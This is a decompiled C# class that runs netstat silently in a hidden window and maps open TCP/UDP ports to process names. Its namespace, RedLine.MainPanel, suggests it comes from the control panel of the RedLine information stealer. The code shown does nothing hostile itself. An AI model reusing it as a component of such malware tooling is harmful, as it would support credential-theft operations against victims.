using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;

namespace RedLine.MainPanel.Data.Core;

public static class ProcessPorts
{
	public static List<ProcessPort> ProcessPortMap => (List<ProcessPort>)smethod_0();

	private static object smethod_0()
	{
		List<ProcessPort> list = new List<ProcessPort>();
		try
		{
			using Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "netstat.exe";
			processStartInfo.Arguments = "-a -n -o";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.RedirectStandardInput = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			process.StartInfo = processStartInfo;
			process.Start();
			StreamReader standardOutput = process.StandardOutput;
			string input = string.Concat(str1: process.StandardError.ReadToEnd(), str0: standardOutput.ReadToEnd());
			if (process.ExitCode.ToString() != "0")
			{
				return list;
			}
			string[] array = Regex.Split(input, "\r\n");
			for (int i = 0; i < array.Length; i++)
			{
				string[] array2 = Regex.Split(array[i], "\\s+");
				if (array2.Length > 4 && (array2[1].Equals("UDP") || array2[1].Equals("TCP")))
				{
					string text = Regex.Replace(array2[2], "\\[(.*?)\\]", "1.1.1.1");
					try
					{
						list.Add(new ProcessPort((string)((array2[1] == "UDP") ? smethod_1((uint)Convert.ToInt16(array2[4])) : smethod_1((uint)Convert.ToInt16(array2[5]))), (array2[1] == "UDP") ? Convert.ToInt16(array2[4]) : Convert.ToInt16(array2[5]), text.Contains("1.1.1.1") ? $"{array2[1]}v6" : $"{array2[1]}v4", Convert.ToInt32(text.Split(':')[1])));
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	private static object smethod_1(uint ProcessId)
	{
		string result = "UNKNOWN";
		try
		{
			result = Process.GetProcessById((int)ProcessId).ProcessName;
		}
		catch
		{
		}
		return result;
	}
}
